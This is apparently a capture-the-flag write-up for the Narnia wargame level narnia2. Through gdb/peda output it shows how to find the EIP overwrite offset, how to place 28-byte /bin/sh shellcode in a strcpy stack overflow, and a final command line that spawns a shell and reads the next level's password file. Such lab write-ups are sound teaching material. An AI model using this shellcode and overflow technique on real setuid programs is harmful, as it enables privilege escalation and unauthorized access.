# narnia3

This BoF does not use environment variables to store the shellcode. Where to put it then? I mean, after compromising the program's control flow, where do we set EIP to? The key here is to put our shellcode in the input (instead of "A"'s) and then appending the address of the beginning of the shellcode. Somewhat like *jumping back*.

Opening the binary with peda, lets first find how many bytes we need to crash the program (ie overwrite EIP):

~~~~
narnia2@melinda:/narnia$ gdb -q ./narnia2
Reading symbols from ./narnia2...(no debugging symbols found)...done.
(gdb) source /usr/local/peda/peda.py 
gdb-peda$ pdisass main
Dump of assembler code for function main:
   0x0804845d <+0>: push   ebp
   0x0804845e <+1>: mov    ebp,esp
   0x08048460 <+3>: and    esp,0xfffffff0
   0x08048463 <+6>: sub    esp,0x90
   0x08048469 <+12>:    cmp    DWORD PTR [ebp+0x8],0x1
   0x0804846d <+16>:    jne    0x8048490 <main+51>
   0x0804846f <+18>:    mov    eax,DWORD PTR [ebp+0xc]
   0x08048472 <+21>:    mov    eax,DWORD PTR [eax]
   0x08048474 <+23>:    mov    DWORD PTR [esp+0x4],eax
   0x08048478 <+27>:    mov    DWORD PTR [esp],0x8048560
   0x0804847f <+34>:    call   0x8048310 <printf@plt>
   0x08048484 <+39>:    mov    DWORD PTR [esp],0x1
   0x0804848b <+46>:    call   0x8048340 <exit@plt>
   0x08048490 <+51>:    mov    eax,DWORD PTR [ebp+0xc]
   0x08048493 <+54>:    add    eax,0x4
   0x08048496 <+57>:    mov    eax,DWORD PTR [eax]
   0x08048498 <+59>:    mov    DWORD PTR [esp+0x4],eax
   0x0804849c <+63>:    lea    eax,[esp+0x10]
   0x080484a0 <+67>:    mov    DWORD PTR [esp],eax
   0x080484a3 <+70>:    call   0x8048320 <strcpy@plt>
   0x080484a8 <+75>:    lea    eax,[esp+0x10]
   0x080484ac <+79>:    mov    DWORD PTR [esp+0x4],eax
   0x080484b0 <+83>:    mov    DWORD PTR [esp],0x8048574
   0x080484b7 <+90>:    call   0x8048310 <printf@plt>
   0x080484bc <+95>:    mov    eax,0x0
   0x080484c1 <+100>:   leave  
   0x080484c2 <+101>:   ret    
End of assembler dump.
gdb-peda$ b *0x080484c2
Breakpoint 1 at 0x80484c2
db-peda$ pattern_arg 150
Set 1 arguments to program
gdb-peda$ run
Starting program: /games/narnia/narnia2 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA'
[----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0xf7fca000 --> 0x1a8da8 
ECX: 0x0 
EDX: 0xf7fcb898 --> 0x0 
ESI: 0x0 
EDI: 0x0 
EBP: 0x41514141 ('AAQA')
ESP: 0xffffd63c ("AmAARAAoAA")
EIP: 0x80484c2 (<main+101>: ret)
EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x80484b7 <main+90>: call   0x8048310 <printf@plt>
   0x80484bc <main+95>: mov    eax,0x0
   0x80484c1 <main+100>:    leave  
=> 0x80484c2 <main+101>:    ret    
   0x80484c3:   xchg   ax,ax
   0x80484c5:   xchg   ax,ax
   0x80484c7:   xchg   ax,ax
   0x80484c9:   xchg   ax,ax
[------------------------------------stack-------------------------------------]
0000| 0xffffd63c ("AmAARAAoAA")
0004| 0xffffd640 ("RAAoAA")
0008| 0xffffd644 --> 0xff004141 
0012| 0xffffd648 --> 0xffffd6e0 --> 0xffffd8b9 ("XDG_SESSION_ID=40693")
0016| 0xffffd64c --> 0xf7feacca (add    ebx,0x12336)
0020| 0xffffd650 --> 0x2 
0024| 0xffffd654 --> 0xffffd6d4 --> 0xffffd80c ("/games/narnia/narnia2")
0028| 0xffffd658 --> 0xffffd674 --> 0x143825d1 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x080484c2 in main ()
gdb-peda$ n
[----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0xf7fca000 --> 0x1a8da8 
ECX: 0x0 
EDX: 0xf7fcb898 --> 0x0 
ESI: 0x0 
EDI: 0x0 
EBP: 0x41514141 ('AAQA')
ESP: 0xffffd640 ("RAAoAA")
EIP: 0x41416d41 ('AmAA')
EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41416d41
[------------------------------------stack-------------------------------------]
0000| 0xffffd640 ("RAAoAA")
0004| 0xffffd644 --> 0xff004141 
0008| 0xffffd648 --> 0xffffd6e0 --> 0xffffd8b9 ("XDG_SESSION_ID=40693")
0012| 0xffffd64c --> 0xf7feacca (add    ebx,0x12336)
0016| 0xffffd650 --> 0x2 
0020| 0xffffd654 --> 0xffffd6d4 --> 0xffffd80c ("/games/narnia/narnia2")
0024| 0xffffd658 --> 0xffffd674 --> 0x143825d1 
0028| 0xffffd65c --> 0x8049768 --> 0xf7e3a9e0 (<__libc_start_main>: push   ebp)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x41416d41 in ?? ()
gdb-peda$ pattern_search 
Registers contain pattern buffer:
EIP+0 found at offset: 140
EBP+0 found at offset: 136
Registers point to pattern buffer:
[ESP] --> offset 144 - size ~6
Pattern buffer found at:
0xf7fd6000 : offset    0 - size  150 (mapped)
0xffffd5b0 : offset    0 - size  150 ($sp + -0x90 [-36 dwords])
0xffffd822 : offset    0 - size  150 ($sp + 0x1e2 [120 dwords])
References to pattern buffer found at:
0xf7fcaac4 : 0xf7fd6000 (/lib32/libc-2.19.so)
0xf7fcaac8 : 0xf7fd6000 (/lib32/libc-2.19.so)
0xf7fcaacc : 0xf7fd6000 (/lib32/libc-2.19.so)
0xf7fcaad0 : 0xf7fd6000 (/lib32/libc-2.19.so)
0xf7fcaad8 : 0xf7fd6000 (/lib32/libc-2.19.so)
0xf7fcaadc : 0xf7fd6000 (/lib32/libc-2.19.so)
0xffffcf44 : 0xf7fd6000 ($sp + -0x6fc [-447 dwords])
0xffffd034 : 0xffffd5b0 ($sp + -0x60c [-387 dwords])
0xffffd104 : 0xffffd5b0 ($sp + -0x53c [-335 dwords])
0xffffd590 : 0xffffd5b0 ($sp + -0xb0 [-44 dwords])
0xffffd5a4 : 0xffffd5b0 ($sp + -0x9c [-39 dwords])
0xffffd6d8 : 0xffffd822 ($sp + 0x98 [38 dwords])
~~~~

Nice, so it happens at offset 140. This means that bytes 140 to 144 overwrite EIP. Ok, so our shellcode now (taken from somewhere deep in the internet):

    \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80

Checking how long this is:

~~~~
$ python
Python 3.5.2 (default, Nov 17 2016, 17:05:23) 
[GCC 5.4.0 20160609] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> len('\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80')
28
~~~~

So we need to send 140-28=112 bytes of gibberish, followed by our shellcode and the address where it begins. And finding this address is the last part here.

~~~~
gdb-peda$ run $(python -c 'print "A"*112 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "BBBB"')
Starting program: /games/narnia/narnia2 $(python -c 'print "A"*112 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "BBBB"')
[----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0xf7fca000 --> 0x1a8da8 
ECX: 0x0 
EDX: 0xf7fcb898 --> 0x0 
ESI: 0x0 
EDI: 0x0 
EBP: 0x80cd40c0 
ESP: 0xffffd64c ("BBBB")
EIP: 0x80484c2 (<main+101>: ret)
EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x80484b7 <main+90>: call   0x8048310 <printf@plt>
   0x80484bc <main+95>: mov    eax,0x0
   0x80484c1 <main+100>:    leave  
=> 0x80484c2 <main+101>:    ret    
   0x80484c3:   xchg   ax,ax
   0x80484c5:   xchg   ax,ax
   0x80484c7:   xchg   ax,ax
   0x80484c9:   xchg   ax,ax
[------------------------------------stack-------------------------------------]
0000| 0xffffd64c ("BBBB")
0004| 0xffffd650 --> 0x0 
0008| 0xffffd654 --> 0xffffd6e4 --> 0xffffd812 ("/games/narnia/narnia2")
0012| 0xffffd658 --> 0xffffd6f0 --> 0xffffd8b9 ("XDG_SESSION_ID=40693")
0016| 0xffffd65c --> 0xf7feacca (add    ebx,0x12336)
0020| 0xffffd660 --> 0x2 
0024| 0xffffd664 --> 0xffffd6e4 --> 0xffffd812 ("/games/narnia/narnia2")
0028| 0xffffd668 --> 0xffffd684 --> 0x517ae140 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x080484c2 in main ()
gdb-peda$ x/150x $esp
0xffffd64c: 0x42424242  0x00000000  0xffffd6e4  0xffffd6f0
0xffffd65c: 0xf7feacca  0x00000002  0xffffd6e4  0xffffd684
0xffffd66c: 0x08049768  0x0804821c  0xf7fca000  0x00000000
0xffffd67c: 0x00000000  0x00000000  0x517ae140  0x69836550
0xffffd68c: 0x00000000  0x00000000  0x00000000  0x00000002
0xffffd69c: 0x08048360  0x00000000  0xf7ff04c0  0xf7e3a9e9
0xffffd6ac: 0xf7ffd000  0x00000002  0x08048360  0x00000000
0xffffd6bc: 0x08048381  0x0804845d  0x00000002  0xffffd6e4
0xffffd6cc: 0x080484d0  0x08048540  0xf7feb160  0xffffd6dc
0xffffd6dc: 0x0000001c  0x00000002  0xffffd812  0xffffd828
0xffffd6ec: 0x00000000  0xffffd8b9  0xffffd8ce  0xffffd8de
0xffffd6fc: 0xffffd8f2  0xffffd914  0xffffd928  0xffffd931
0xffffd70c: 0xffffd93e  0xffffde5f  0xffffde6a  0xffffde76
0xffffd71c: 0xffffded4  0xffffdeeb  0xffffdefa  0xffffdf06
0xffffd72c: 0xffffdf17  0xffffdf20  0xffffdf33  0xffffdf3b
0xffffd73c: 0xffffdf4b  0xffffdf80  0xffffdfa0  0xffffdfc0
0xffffd74c: 0x00000000  0x00000020  0xf7fdadb0  0x00000021
0xffffd75c: 0xf7fda000  0x00000010  0x0f8bfbff  0x00000006
0xffffd76c: 0x00001000  0x00000011  0x00000064  0x00000003
0xffffd77c: 0x08048034  0x00000004  0x00000020  0x00000005
0xffffd78c: 0x00000008  0x00000007  0xf7fdc000  0x00000008
0xffffd79c: 0x00000000  0x00000009  0x08048360  0x0000000b
0xffffd7ac: 0x000036b2  0x0000000c  0x000036b2  0x0000000d
0xffffd7bc: 0x000036b2  0x0000000e  0x000036b2  0x00000017
0xffffd7cc: 0x00000000  0x00000019  0xffffd7fb  0x0000001f
0xffffd7dc: 0xffffdfe2  0x0000000f  0xffffd80b  0x00000000
0xffffd7ec: 0x00000000  0x00000000  0x00000000  0xd4000000
0xffffd7fc: 0x2032f2d1  0x725fd76b  0x713c3550  0x69469f33
0xffffd80c: 0x00363836  0x672f0000  0x73656d61  0x72616e2f
0xffffd81c: 0x2f61696e  0x6e72616e  0x00326169  0x41414141
0xffffd82c: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffd83c: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffd84c: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffd85c: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffd86c: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffd87c: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffd88c: 0x41414141  0x41414141  0x41414141  0x6850c031
0xffffd89c: 0x68732f2f  0x69622f68
gdb-peda$ find 0x6850c031
Searching for '0x6850c031' in: None ranges
Found 3 results, display max 3 items:
 mapped : 0xf7fd6070 --> 0x6850c031 
[stack] : 0xffffd630 --> 0x6850c031 
[stack] : 0xffffd898 --> 0x6850c031 
~~~~

So there it is! *0xffffd898* is the address where our shellcode begins. We substitute "BBBB" by this address now and finally get our shellcode o/

~~~~
arnia2@melinda:/narnia$ ./narnia2 $(python -c 'print "A"*112 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\x98\xd8\xff\xff"')
$ cat /etc/narnia_pass/narnia3
xxxxxxxxxxxxx
~~~~
